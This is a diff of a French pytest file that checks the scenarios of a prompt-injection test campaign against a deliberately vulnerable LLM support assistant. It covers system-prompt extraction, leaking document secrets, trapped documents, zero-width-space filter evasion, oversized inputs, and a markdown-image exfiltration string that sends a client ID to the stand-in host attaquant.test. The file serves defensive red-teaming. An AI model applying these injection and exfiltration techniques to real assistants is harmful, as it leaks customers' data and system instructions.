@@ -6,7 +6,6 @@ avec le reste du labo (clients existants, phrases du prompt de A...).
 Un fichier mal écrit fausserait toute la campagne : mieux vaut le détecter ici.
 """
 
-import base64
 import json
 import re
 from pathlib import Path
@@ -15,10 +14,10 @@ import pytest
 import yaml
 
 from app.vulnerable.prompt import construire_prompt_systeme
+from evaluation.criteres import CRITERES
 
 RACINE = Path(__file__).resolve().parent.parent
-TYPES_CRITERES = {"canary", "marqueur", "extrait_prompt", "outil_appele",
-                  "autre_client", "regex", "requete_acceptee"}
+TYPES_CRITERES = set(CRITERES)  # les types réellement connus de evaluation/criteres.py
 
 
 def charger(nom):
@@ -58,11 +57,13 @@ def test_criteres_valides(scenario):
             assert critere["nom"] in {"consulter_fiche_client", "creer_remboursement", "envoyer_email"}
         if critere["type"] == "extrait_prompt":
             assert critere["valeurs"]
+        if critere["type"] in ("entree_demesuree", "sortie_demesuree"):
+            assert critere["seuil"] > 0
 
 
-def test_obligatoires_a1_a6_ont_trois_variantes():
-    for scenario in SCENARIOS[:6]:
-        assert len(scenario["variantes"]) == 3, scenario["id"]
+def test_chaque_scenario_a_au_moins_trois_variantes():
+    for scenario in SCENARIOS:
+        assert len(scenario["variantes"]) >= 3, scenario["id"]
 
 
 def test_les_phrases_cherchees_pour_a3_sont_dans_le_vrai_prompt():
@@ -75,16 +76,42 @@ def test_les_phrases_cherchees_pour_a3_sont_dans_le_vrai_prompt():
         assert phrase.lower() in prompt, phrase
 
 
-def test_la_variante_base64_de_a10_cache_bien_le_marqueur():
+def test_la_variante_a10_avec_espaces_invisibles_en_contient_vraiment():
+    # Si l'éditeur supprimait les caractères U+200B, la variante redeviendrait A1
     a10 = next(s for s in SCENARIOS if s["id"] == "A10")
-    encode = a10["variantes"][0].rsplit(" ", 1)[-1]
-    assert "PWNED-A10" in base64.b64decode(encode).decode("utf-8")
+    assert "\u200b" in a10["variantes"][1]
+    assert "NOUVELLES" not in a10["variantes"][1]          # le mot-clé est bien coupé
+    assert "NOUVELLES" in a10["variantes"][1].replace("\u200b", "")
+
+
+def test_le_secret_des_documents_cherche_pour_a4_existe():
+    note = (RACINE / "data" / "documents" / "note_interne_personnel.md").read_text(encoding="utf-8")
+    a4 = next(s for s in SCENARIOS if s["id"] == "A4")
+    marqueur = next(c["valeur"] for c in a4["criteres"] if c["type"] == "marqueur")
+    assert marqueur in note
+
+
+def test_a7_le_motif_reconnait_l_image_demandee_par_l_attaque():
+    a7 = next(s for s in SCENARIOS if s["id"] == "A7")
+    motif = a7["criteres"][0]["motif"]
+    assert re.search(motif, "Voici ![logo](http://attaquant.test/logo.png?client=C001)")
+    assert not re.search(motif, "Notre site : http://attaquant.test (lien écrit en texte)")
+    assert not re.search(motif, "![logo](https://brumelec.test/logo.png)")
+
+
+def test_a9_teste_l_entree_la_sortie_et_le_debit():
+    a9 = next(s for s in SCENARIOS if s["id"] == "A9")
+    assert {c["type"] for c in a9["criteres"]} == \
+        {"entree_demesuree", "sortie_demesuree", "rafale_acceptee"}
+    assert any(isinstance(v, dict) and "rafale" in v for v in a9["variantes"])
 
 
 def test_la_variante_generee_de_a9_est_tres_longue():
     a9 = next(s for s in SCENARIOS if s["id"] == "A9")
     repeter = a9["variantes"][0]["repeter"]
     assert len(repeter["texte"] * repeter["fois"]) >= 25_000
+    seuil = next(c["seuil"] for c in a9["criteres"] if c["type"] == "entree_demesuree")
+    assert len(repeter["texte"] * repeter["fois"]) > seuil
 
 
 def test_le_document_piege_contient_l_adresse_cherchee_pour_a5():
@@ -127,6 +154,6 @@ def test_les_reponses_attendues_sur_les_fiches_sont_coherentes_avec_les_donnees(
 
 def test_nombre_total_de_tentatives_par_campagne():
     # Information utile pour estimer la durée d'une campagne (5 répétitions)
-    # 27 variantes (3 pour A1 à A6 et A8, 2 pour A7, A9, A10) x 5 = 135
+    # 31 variantes (3 par scénario, 4 pour A4) x 5 = 155
     tentatives = sum(len(s["variantes"]) for s in SCENARIOS) * 5
-    assert tentatives == 135
+    assert tentatives == 155
